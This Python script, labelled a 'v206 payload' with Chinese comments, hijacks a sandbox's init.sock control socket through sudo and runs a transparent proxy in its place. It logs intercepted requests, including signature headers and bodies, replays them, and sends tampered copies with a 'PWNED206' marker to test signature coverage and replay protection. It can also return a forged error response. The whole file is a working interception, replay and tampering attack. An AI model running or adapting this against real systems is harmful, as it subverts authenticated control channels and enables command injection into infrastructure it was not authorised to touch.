# -*- coding: utf-8 -*-
"""v206 payload (sandbox user, root): init.sock 透明代理 + 重放测试
1. sudo mv init.sock init.sock.bak -> 监听原路径
2. accept -> 完整记录请求(头+body) -> 转发原 socket(proxy) -> 真实响应回 celld
3. 重放测试: 原样重放 + 修改 body 重放 (判断签名是否覆盖 body / 有无重放保护)
4. 60s -> 恢复"""
import socket, time, os, subprocess, signal

signal.alarm(150)
SOCKPATH = '/run/vercel/share/init.sock'
BAK = SOCKPATH + '.bak'
LOG = '/vercel/sandbox/v206hook.log'
f = open(LOG, 'w', encoding='utf-8', errors='replace')


def log(s):
    line = '[%.1f] %s' % (time.time(), s)
    f.write(line + '\n')
    f.flush()
    print(line, flush=True)


def read_http(conn, timeout=8):
    conn.settimeout(timeout)
    d = b''
    while b'\r\n\r\n' not in d:
        try:
            x = conn.recv(65536)
        except socket.timeout:
            break
        except Exception:
            break
        if not x:
            break
        d += x
        if len(d) > 300000:
            break
    if b'\r\n\r\n' not in d:
        return d
    head, _, rest = d.partition(b'\r\n\r\n')
    cl = 0
    for ln in head.split(b'\r\n'):
        if ln.lower().startswith(b'content-length:'):
            try:
                cl = int(ln.split(b':', 1)[1].strip())
            except Exception:
                pass
    while len(rest) < cl:
        try:
            x = conn.recv(65536)
        except socket.timeout:
            break
        except Exception:
            break
        if not x:
            break
        rest += x
    return head + b'\r\n\r\n' + rest[:cl]


def proxy_once(req, timeout=15):
    up = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
    up.settimeout(timeout)
    up.connect(BAK)
    up.sendall(req)
    resp = read_http(up, timeout)
    up.close()
    return resp


log('=== hook start ===')
r = subprocess.run(['sudo', '-n', 'mv', SOCKPATH, BAK], capture_output=True, timeout=5)
log('MV rc=%d err=%r' % (r.returncode, r.stderr[:200]))
try:
    os.unlink(SOCKPATH)
except Exception:
    pass
srv = socket.socket(socket.AF_UNIX, socket.SOCK_STREAM)
srv.bind(SOCKPATH)
srv.listen(16)
srv.settimeout(1)
log('HOOK LISTENING')

end = time.time() + 60
n = 0
while time.time() < end:
    try:
        c, _ = srv.accept()
    except socket.timeout:
        continue
    except Exception as e:
        log('ACCEPT EXC %s' % e)
        break
    n += 1
    try:
        req = read_http(c, 6)
    except Exception as e:
        log('CONN %d READ EXC %s' % (n, e))
        c.close()
        continue
    log('CONN %d req %d bytes' % (n, len(req)))
    for line in req.split(b'\r\n'):
        lw = line.lower()
        if b'signature' in lw or b'timestamp' in lw or lw.startswith(b'post '):
            log('  HDR %r' % line[:400])
    body = req.split(b'\r\n\r\n', 1)[1] if b'\r\n\r\n' in req else b''
    log('  BODY %r' % body[:800])
    resp = b''
    try:
        resp = proxy_once(req)
        log('  PROXY resp %d: %r' % (len(resp), resp[:300]))
        try:
            c.sendall(resp)
        except Exception:
            pass
    except Exception as e:
        log('  PROXY EXC %s' % e)
        try:
            bd = b'\x02\x00\x00\x00I{"error":{"code":"unauthenticated","message":"missing signature header"}}'
            c.sendall(b'HTTP/1.1 200 OK\r\nContent-Type: application/connect+json\r\nContent-Length: %d\r\nConnection: close\r\n\r\n' % len(bd) + bd)
        except Exception:
            pass
    c.close()
    # 重放测试 (前 3 个连接): 原样 + 改 body
    if n <= 3 and resp:
        try:
            r2 = proxy_once(req)
            log('  REPLAY-raw resp %d: %r' % (len(r2), r2[:300]))
        except Exception as e:
            log('  REPLAY-raw EXC %s' % e)
        # 修改 body 重放: 替换命令参数标记
        mod = req.replace(b'hello-v206', b'PWNED206')
        mod = mod.replace(b'hello-v205', b'PWNED206')
        if mod != req:
            try:
                r3 = proxy_once(mod)
                log('  REPLAY-mod resp %d: %r' % (len(r3), r3[:300]))
            except Exception as e:
                log('  REPLAY-mod EXC %s' % e)
        else:
            log('  REPLAY-mod skip (no marker)')

srv.close()
try:
    os.unlink(SOCKPATH)
except Exception:
    pass
r = subprocess.run(['sudo', '-n', 'mv', BAK, SOCKPATH], capture_output=True, timeout=5)
log('RESTORE rc=%d err=%r' % (r.returncode, r.stderr[:200]))
log('V206_DONE conns=%d' % n)
f.close()
